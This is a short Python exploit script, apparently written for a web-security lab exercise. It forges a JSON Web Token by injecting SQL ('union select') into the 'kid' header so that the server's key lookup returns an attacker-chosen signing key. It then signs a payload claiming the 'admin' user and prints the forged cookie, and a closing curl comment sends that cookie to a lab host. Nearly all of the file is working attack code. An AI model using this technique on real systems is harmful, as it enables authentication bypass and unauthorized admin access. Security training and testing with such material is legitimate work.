import hmac
import base64
import hashlib
import json
from sys import version_info


# SELECT key FROM keys WHERE kid='[]'
# SELECT key FROM keys WHERE kid='key1'
# SELECT key FROM keys WHERE kid='zzzzzzzzzzzzzzzzzz' UNTION SELECT 'aaa'
# ===>> should return "aaa"

# orig decoded header = {"typ":"JWT","alg":"HS256","kid":"key1"}
header = {"typ":"JWT","alg":"HS256","kid":"zzzzzzzzzzzzzzzzzz' union select 'aaa"}

# orig decoded payload = '{"user":null}'
payload = {"user":"admin"}

key4 = "aaa" #of course this would be the key...lol


if version_info[0] == 2:
    str = base64.urlsafe_b64encode(json.dumps(header)).rstrip("=")+"."+base64.urlsafe_b64encode(json.dumps(payload)).rstrip("=")
    sig = base64.urlsafe_b64encode(hmac.new(key4, str, hashlib.sha256).digest()).decode('utf8').rstrip("=")
    print("cookie: "+str+"."+sig)

else:
    str = base64.urlsafe_b64encode(bytes(json.dumps(header), encoding='utf8')).decode('utf8').rstrip("=")+"."+base64.urlsafe_b64encode(bytes(json.dumps(payload), encoding='utf8')).decode('utf8').rstrip("=")
    
    sig = base64.urlsafe_b64encode(hmac.new(bytes(key4, encoding='utf8'), str.encode('utf8'), hashlib.sha256).digest()).decode('utf8').rstrip("=")
    print("cookie: "+str+"."+sig)




# curl -H "Cookie: auth=eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJIUzI1NiIsICJraWQiOiAienp6enp6enp6enp6enp6enp6JyB1bmlvbiBzZWxlY3QgJ2FhYSJ9.eyJ1c2VyIjogImFkbWluIn0.TqEjZ-uMIpSiHghIUJhwxLB6nSYTd0dCtlE5kHVEiyc" http://ptl-bf3b9793-fd439f03.libcurl.so/